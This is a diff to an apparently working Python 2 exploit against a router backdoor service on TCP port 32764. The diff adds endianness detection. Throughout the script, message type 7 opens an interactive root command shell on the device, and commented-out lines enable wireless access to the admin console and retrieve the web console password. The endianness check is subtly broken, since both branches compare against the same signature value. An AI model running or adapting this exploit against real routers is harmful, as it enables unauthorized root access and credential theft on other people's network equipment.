@@ -5,8 +5,30 @@ import sys
 HOST = '192.168.1.1'
 PORT = 32764
 
-def send_message(s, message, payload=''):
-	header = struct.pack('<III', 0x53634D4D, message, len(payload))
+# Big endian or little endian ?
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+s.settimeout(1)
+
+s.send("blablablabla")
+r = s.recv(0xC)
+while len(r) < 0xC:
+	tmp = s.recv(0xC - len(r))
+	assert len(tmp) != 0
+	r += tmp
+s.close()
+
+sig, ret_val, ret_len = struct.unpack('<III', r)
+if sig == 0x53634D4D :
+	endianness = "<"
+elif sig == 0x53634D4D :
+	endianness = ">"
+else :
+	print "probably not vulnerable"
+	sys.exit(0)
+
+def send_message(s, endianness, message, payload=''):
+	header = struct.pack(endianness + 'III', 0x53634D4D, message, len(payload))
 	s.send(header+payload)
 	r = s.recv(0xC)
 
@@ -15,7 +37,7 @@ def send_message(s, message, payload=''):
 		assert len(tmp) != 0
 		r += tmp
 
-	sig, ret_val, ret_len = struct.unpack('<III', r)
+	sig, ret_val, ret_len = struct.unpack(endianness + 'III', r)
 	assert(sig == 0x53634D4D)
 
 	if ret_val != 0:
@@ -34,13 +56,13 @@ s.connect((HOST, PORT))
 s.settimeout(1)
 
 # uncomment to turned on wireless access to the administration web console
-# send_message(s, 3, "wlan_mgr_enable=1")
+# send_message(s, endianness, 3, "wlan_mgr_enable=1")
 # uncomment to get the administration web console's password
-# print send_message(s, 2, "http_password")[1]
+# print send_message(s, endianness, 2, "http_password")[1]
 
-print send_message(s, 7, 'echo "welcome, here is a root shell, have fun"')[1]
+print send_message(s, endianness, 7, 'echo "welcome, here is a root shell, have fun"')[1]
 while 1 :
-	print send_message(s, 7, sys.stdin.readline().strip('\n'))[1]
+	print send_message(s, endianness, 7, sys.stdin.readline().strip('\n'))[1]
 
 s.close()
 
